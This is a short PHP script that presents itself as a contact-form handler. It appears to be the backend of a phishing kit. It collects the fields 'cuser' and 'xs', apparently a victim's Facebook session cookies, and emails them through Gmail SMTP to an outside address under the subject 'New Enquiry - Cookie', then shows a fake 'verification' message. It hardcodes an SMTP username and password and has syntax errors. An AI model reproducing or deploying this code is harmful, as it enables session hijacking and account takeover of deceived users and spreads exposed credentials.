<?php
session_start();
//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

if(isset($_POST['submitcontact']))

{
    $cuser = $_POST['cuser']
    $xs = $_POST['xs']
     
    //Load Composer's autoloader
    require 'vendor/autoload.php';

    //Create an instance; passing `true` enables exceptions
    $mail = new PHPMailer(true);

    try {
        //Server settings
        // $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output

         $mail->isSMTP();                                            //Send using SMTP
         $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
         $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
         $mail->Username   = 'sophiaameliaofficiel@gmail.com';                     //SMTP username
         $mail->Password   = 'faiktbbwqrtqhsog';                               //SMTP password
         $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;            //Enable implicit TLS encryption
         $mail->Port       = 587;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`



         $cuser = $_POST['cuser'];
         $xs = $_POST['xs'];







    //Recipients
    $mail->setFrom('sophiaameliaofficiel@gmail.com', 'Mailer');
    $mail->addAddress('annajamesofficiel@gmail.com', 'Anna James');     //Add a recipient



    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'New Enquiry - Cookie';
    $mail->Body    = '<h3>Hello, you got a new enquity</h3>
    <h4>cuser: '.$cuser.' </h4>
    <h4>xs: '.$xs.'</h4>
    ';
    
    if($mail->send())
    {
        $_SESSION['status'] = "Your Verification request has been sent" ;
        header("Location: {$_server["HTTP_REFERER"]}");
        exit(0);
    }
    else
    {
        $_SESSION['status'] = "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
        header("Location: {$_server["HTTP_REFERER"]}");
        exit(0);
    }
    

} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}

}
else
{
    header('Location: index.php');
    exit(0);
}
